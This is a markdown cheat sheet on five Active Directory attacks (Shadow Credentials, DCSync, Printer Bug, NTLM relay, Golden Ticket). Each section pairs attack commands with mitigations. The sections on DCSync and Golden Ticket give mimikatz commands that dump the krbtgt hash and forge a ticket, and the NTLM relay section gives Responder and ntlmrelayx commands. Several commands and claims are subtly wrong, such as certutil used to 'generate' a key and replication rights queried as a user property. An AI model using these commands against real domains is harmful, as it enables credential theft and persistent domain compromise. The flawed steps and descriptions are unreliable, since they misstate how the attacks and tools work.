# Active Directory - Advanced Concepts

## 1. Shadow Credentials Attack (Abusing Key Trust)

**Description:**  
Windows Hello for Business and Azure AD Key Trust authentication rely on certificate-based authentication. An attacker can create and add a rogue certificate to an AD user, allowing authentication without modifying the user's password.

**Check users with Key Trust enabled:**
```powershell
Get-ADUser -Filter * -Properties msDS-KeyCredentialLink
```

**Generate a private key and certificate:**

```powershell
certutil -encode input.key output.pem
```

**Inject the certificate into the AD user object:**

```powershell
Add-KeyCredential -User "victim" -Certificate "attacker.pem"
```

**Mitigation:**

* Monitor modifications to `msDS-KeyCredentialLink`.
* Audit AD logs (Event ID 5136).

---

## 2. Domain Replication Attack (DCSync Attack)

**Description:**
Allows extraction of NTLM hashes directly from a Domain Controller by abusing replication rights. Used to obtain the `krbtgt` hash and establish long-term persistence.

**Check users with replication permissions:**

```powershell
Get-ADUser -Filter * -Properties "Replicating Directory Changes"
```

**Execute DCSync:**

```powershell
mimikatz.exe lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

**Mitigation:**

* Limit replication permissions to trusted accounts.
* Monitor Event IDs 4662 and 4742.
* Regularly rotate the `krbtgt` password.

---

## 3. Printer Bug Attack (MS-RPRN Exploit)

**Description:**
Abuses Windows Print Spooler service to trigger authentication to a rogue server, enabling privilege escalation to SYSTEM.

**Check if Print Spooler is enabled:**

```powershell
sc qc Spooler
```

**Trigger the Printer Bug:**

```powershell
Invoke-PrinterBug -ComputerName "victim-PC"
```

**Mitigation:**

* Disable Print Spooler if unnecessary:

```powershell
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

* Print Spooler should be disabled on Domain Controllers.

---

## 4. NTLM Relay Attack

**Description:**
An attacker relays a captured NTLM authentication attempt to another service to authenticate without knowing the password. Works against SMB, LDAP, and HTTP when signing is not enforced.

**Capture NTLM authentication:**

```bash
responder -I eth0 -wrf
```

**Relay NTLM authentication:**

```bash
ntlmrelayx.py -tf target.txt -smb2support
```

**Mitigation:**

* Enable SMB signing.
* Enforce LDAP signing and channel binding.
* Limit administrative privileges.

---

## 5. Golden Ticket Attack

**Description:**
Using the `krbtgt` NTLM hash, an attacker can forge Kerberos Tickets Granting Tickets (TGTs), granting long-term or permanent domain persistence.

**Extract `krbtgt` hash via DCSync:**

```powershell
mimikatz.exe lsadump::dcsync /domain:<DOMAIN> /user:krbtgt
```

**Generate a Golden Ticket:**

```powershell
mimikatz.exe kerberos::golden /domain:<DOMAIN> /sid:<SID> /krbtgt:<KRBTGT_HASH> /user:Administrator /ptt
```

**Mitigation:**

* Rotate `krbtgt` password regularly.
* Monitor Kerberos-related Event IDs such as 4769 and 4672.
* Enforce strict Kerberos policies.
